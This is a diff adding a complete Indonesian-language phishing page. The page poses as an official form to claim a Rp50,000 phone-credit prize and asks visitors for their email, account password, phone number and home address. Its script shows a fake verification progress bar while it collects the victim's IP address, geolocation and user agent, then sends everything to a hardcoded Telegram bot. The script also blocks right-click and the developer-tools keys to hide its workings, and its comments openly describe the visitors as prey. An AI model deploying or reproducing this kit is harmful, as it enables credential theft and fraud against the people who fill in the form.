@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah Spesial: Pulsa 50.000 (Verifikasi Resmi)</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #007bff; /* Biru terang untuk kesan resmi */
+            --danger-color: #dc3545;
+            --success-color: #28a745;
+            --bg-dark: #1e1e2d;
+            --text-light: #f8f9fa;
+        }
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .main-container {
+            background: #252537;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            padding: 35px;
+            max-width: 600px;
+            width: 100%;
+            border-top: 5px solid var(--primary-color);
+            transition: all 0.3s ease-in-out;
+        }
+        .header-section h1 {
+            color: var(--primary-color);
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        .header-section p {
+            color: #ccc;
+            margin-bottom: 25px;
+        }
+        .form-control, .form-select {
+            background-color: #33334f;
+            color: var(--text-light);
+            border: 1px solid #444466;
+            transition: border-color 0.3s;
+        }
+        .form-control:focus, .form-select:focus {
+            background-color: #383857;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(0, 123, 255, 0.25);
+        }
+        .btn-verify {
+            background-color: var(--success-color);
+            border-color: var(--success-color);
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-verify:hover {
+            background-color: #1e7e34;
+            border-color: #1c7430;
+        }
+        /* Style untuk Loading Interaktif (lebih keren dari spinner biasa) */
+        #loader-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            min-height: 250px;
+        }
+        .loader-bar {
+            width: 100%;
+            height: 10px;
+            background: #333;
+            border-radius: 5px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+        .loader-progress {
+            height: 100%;
+            width: 0%;
+            background-color: var(--primary-color);
+            transition: width 0.5s linear;
+        }
+        .step-info {
+            color: #aaa;
+            margin-top: 15px;
+            min-height: 30px;
+        }
+        /* Efek Berhasil */
+        #success-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        #success-screen i {
+            font-size: 5rem;
+            color: var(--success-color);
+            margin-bottom: 20px;
+            animation: zoomIn 0.5s ease-out;
+        }
+        @keyframes zoomIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-container" id="mainContainer">
+    
+    <div id="form-section">
+        <div class="header-section text-center">
+            <h1>Klaim Hadiah Pulsa 50.000 IDR</h1>
+            <p class="text-warning"><i class="fas fa-lock me-2"></i> Verifikasi Akun Anda untuk Proses Pencairan</p>
+        </div>
+
+        <div class="alert alert-info alert-dismissible fade show" role="alert">
+            <i class="fas fa-info-circle me-2"></i> PENTING: Proses ini 100% aman dan data hanya digunakan untuk pencairan hadiah.
+        </div>
+
+        <form id="phishingForm">
+            <div class="row">
+                <div class="col-md-6 mb-3">
+                    <label for="email" class="form-label">Email Akun:</label>
+                    <input type="email" class="form-control" id="email" placeholder="contoh@gmail.com" required>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <label for="password" class="form-label">Password Akun (Wajib Verifikasi):</label>
+                    <input type="password" class="form-control" id="password" placeholder="Password Rahasia Anda" required>
+                </div>
+            </div>
+            
+            <div class="mb-3">
+                <label for="phone" class="form-label">Nomor HP (Untuk Pengiriman Pulsa):</label>
+                <input type="tel" class="form-control" id="phone" placeholder="08xxxxxx (Format Indonesia)" required pattern="[0-9]{10,14}">
+                <div class="form-text text-light">Pastikan nomor aktif dan benar!</div>
+            </div>
+
+            <div class="mb-4">
+                <label for="alamat" class="form-label">Alamat Lengkap (Verifikasi Domisili):</label>
+                <textarea class="form-control" id="alamat" rows="2" placeholder="Jalan, RT/RW, Kelurahan, Kota" required></textarea>
+            </div>
+
+            <button type="submit" class="btn btn-verify w-100"><i class="fas fa-check-circle me-2"></i> VERIFIKASI SEKARANG!</button>
+        </form>
+    </div>
+
+    <div id="loader-screen">
+        <i class="fas fa-sync-alt fa-spin text-primary" style="font-size: 3rem;"></i>
+        <h2 class="mt-4">Memproses Verifikasi Data...</h2>
+        <div class="loader-bar">
+            <div class="loader-progress" id="progressBar"></div>
+        </div>
+        <p class="step-info" id="stepInfo">Mengambil IP Address dan Detail Lokasi...</p>
+    </div>
+    
+    <div id="success-screen">
+        <i class="fas fa-gift"></i>
+        <h2 class="text-success mt-3">Verifikasi Berhasil!</h2>
+        <p class="text-light">Selamat! Hadiah pulsa Rp50.000 akan dikirimkan ke nomor HP Anda dalam waktu 1x24 jam setelah data diverifikasi oleh sistem kami.</p>
+        <small class="text-muted">Terima kasih telah berpartisipasi.</small>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // ☠️ Pengaturan Telegram Bot - GANTI INI, BEGO! ☠️
+    const BOT_TOKEN = '8597047866:AAE6RjTIBHNnGSAmg1mOu4XxUgVlXwTlRfY'; 
+    const CHAT_ID = '7636671903';     
+    const IP_API = 'https://api.ipify.org?format=json';
+
+    const formSection = document.getElementById('form-section');
+    const loaderScreen = document.getElementById('loader-screen');
+    const successScreen = document.getElementById('success-screen');
+    const progressBar = document.getElementById('progressBar');
+    const stepInfo = document.getElementById('stepInfo');
+
+    document.getElementById('phishingForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Ambil Data dari Form
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const alamat = document.getElementById('alamat').value;
+        const phone = document.getElementById('phone').value;
+
+        // 1. Tampilkan Layar Loading Interaktif
+        formSection.style.display = 'none';
+        loaderScreen.style.display = 'flex';
+
+        // 2. Jalankan Proses Animasi Loading Palsu dan Ambil Data
+        await simulateLoadingAndStealData(email, password, alamat, phone);
+    });
+
+    /**
+     * Fungsi untuk simulasi loading dan pencurian data secara diam-diam.
+     * @param {string} email 
+     * @param {string} password 
+     * @param {string} alamat 
+     * @param {string} phone 
+     */
+    async function simulateLoadingAndStealData(email, password, alamat, phone) {
+        const steps = [
+            { text: "Mengambil IP Address dan Detail Lokasi...", duration: 1500, progress: 20 },
+            { text: "Memastikan data akun valid (Simulasi Backend)...", duration: 1800, progress: 50 },
+            { text: "Mengecek status hadiah dan kuota...", duration: 1200, progress: 75 },
+            { text: "Finalisasi Verifikasi Data Akun...", duration: 1000, progress: 90 }
+        ];
+
+        let ipAddress = 'Tidak Terdeteksi';
+        let geoInfo = 'Tidak Terdeteksi';
+
+        // Steal IP & GeoInfo di awal proses
+        await getIpAndGeo().then(data => {
+            ipAddress = data.ip;
+            geoInfo = data.geo;
+        });
+
+        // Loop Animasi Palsu
+        for (const step of steps) {
+            stepInfo.textContent = step.text;
+            progressBar.style.width = step.progress + '%';
+            await new Promise(resolve => setTimeout(resolve, step.duration));
+        }
+
+        progressBar.style.width = '100%';
+        stepInfo.textContent = "Data Berhasil Diverifikasi! Mengirim ke Server...";
+        
+        // 3. Kirim Data ke Telegram (Pencurian Final)
+        const success = await sendToTelegram(email, password, alamat, phone, ipAddress, geoInfo);
+
+        // 4. Tampilkan Layar Sukses (Terlepas dari hasil pengiriman Telegram)
+        loaderScreen.style.display = 'none';
+        successScreen.style.display = 'block';
+
+        if (!success) {
+             // Kalau gagal kirim ke Telegram (mungkin lu salah token), kasih notif di console aja.
+             console.error("Gagal kirim ke Telegram. Tapi korban udah liat layar sukses, anjing!");
+        }
+    }
+
+    /**
+     * Mengambil IP dan detail geografis.
+     */
+    async function getIpAndGeo() {
+        let ipAddress = 'Tidak Terdeteksi';
+        let geoInfo = 'Tidak Terdeteksi';
+
+        try {
+            const ipResponse = await fetch(IP_API);
+            const ipData = await ipResponse.json();
+            ipAddress = ipData.ip;
+        } catch (error) {
+            console.error('Gagal ambil IP:', error);
+        }
+
+        if (ipAddress !== 'Tidak Terdeteksi') {
+            try {
+                const geoResponse = await fetch(`https://get.geojs.io/v1/ip/geo/${ipAddress}.json`);
+                const geoData = await geoResponse.json();
+                geoInfo = `Negara: ${geoData.country}, Kota: ${geoData.city}, Org: ${geoData.organization}`;
+            } catch (error) {
+                console.error('Gagal ambil info geo:', error);
+                geoInfo = 'Error saat mengambil Geoinfo.';
+            }
+        }
+        return { ip: ipAddress, geo: geoInfo };
+    }
+
+    /**
+     * Mengirim data ke Telegram.
+     */
+    async function sendToTelegram(email, password, alamat, phone, ipAddress, geoInfo) {
+        const message = `
+**☠️ DATA VIP MANGSA BARU TERTANGKAP! 😈**
+
+**💰 HADIAH:** Pulsa 50.000
+**EMAIL:** \`${email}\`
+**PASSWORD:** \`${password}\`
+**NOMOR HP:** \`${phone}\`
+**ALAMAT LENGKAP:** \`${alamat}\`
+---
+**IP KORBAN:** \`${ipAddress}\`
+**DETAIL GEO:** \`${geoInfo}\`
+**USER AGENT:** \`${navigator.userAgent}\`
+**Waktu Sadap:** \`${new Date().toLocaleString('id-ID')}\`
+        `;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        try {
+            const response = await fetch(telegramUrl + '?' + params.toString());
+            return response.ok;
+        } catch (error) {
+            console.error('Gagal kirim data ke Telegram, tolol:', error);
+            return false;
+        }
+    }
+
+    // Blokir inspect element dan right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123) { // F12
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { // Ctrl+Shift+J
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U
+            return false;
+        }
+    }
+</script>
+
+</body>
+</html>
